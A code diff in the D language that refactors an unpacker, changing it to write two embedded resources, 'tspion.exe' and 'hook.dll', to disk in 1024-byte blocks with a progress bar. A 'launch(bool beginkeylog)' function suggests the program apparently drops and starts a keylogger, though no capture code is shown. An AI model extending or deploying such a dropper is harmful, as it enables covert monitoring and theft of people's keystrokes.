@@ -16,6 +16,8 @@ import dfl.internal.winapi;
 import std.stdio;
 import std.string;
 
+enum int BLOCKSIZE = 1024;
+
 void main() {
 	HANDLE hc = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hc, 0x0a);
@@ -41,24 +43,22 @@ void unpack() {
 	char[] exedata = loadExeRC();
 	char[] dlldata = loadDllRC();
 	
-	auto exefile = File("tspion.exe", "w");
-	auto dllfile = File("hook.dll", "w");
-	
-	scope(exit) {
-		exefile.close();
-		dllfile.close();
-	}
-	
-	write_wp(exedata, exefile);
-	write_wp(dlldata, dllfile);
+	write_wp(exedata, "tspion.exe");
+	write_wp(dlldata, "hook.dll");
 }
 
-void write_wp(char[] data, File fl) {
-	float lendata = data.length;
+void write_wp(char[] data, string fname) {
+	uint lendata = data.length;
 	int progress;
 	write("["~" ".repeat(50)~"]"~"   0.00%");
-	foreach(i, c; data) {  //intended to be slow
-		auto cprog = cast(int)((i/lendata)*50);
+    File file = File(fname, "w");
+    scope(exit) file.close();
+    int i,a = 0;
+    int times = lendata/BLOCKSIZE;
+	for(;lendata-i>BLOCKSIZE; i += BLOCKSIZE)
+    {
+        a++;
+		auto cprog = cast(int)((cast(float)i/lendata)*50);
 		if(progress < cprog) {
 			write("\b".repeat(60));
 			write("["~"*".repeat(cprog)~" ".repeat(50-cprog)~"]");
@@ -67,12 +67,15 @@ void write_wp(char[] data, File fl) {
 			stdout.flush();
 			progress = cprog;
 		}
-		fl.rawWrite(std.conv.to!string(c));
+		file.rawWrite(data[i..i+BLOCKSIZE]);
 	}
+    file.rawWrite(data[i..$]);
+    
 	write("\b".repeat(60));
 	write(" ".repeat(60));
 	write("\b".repeat(60));
-	writefln("Unpacked %s.", fl.name);
+	writefln("Unpacked %s.", fname);
+    file.close();
 }
 
 void launch(bool beginkeylog) {
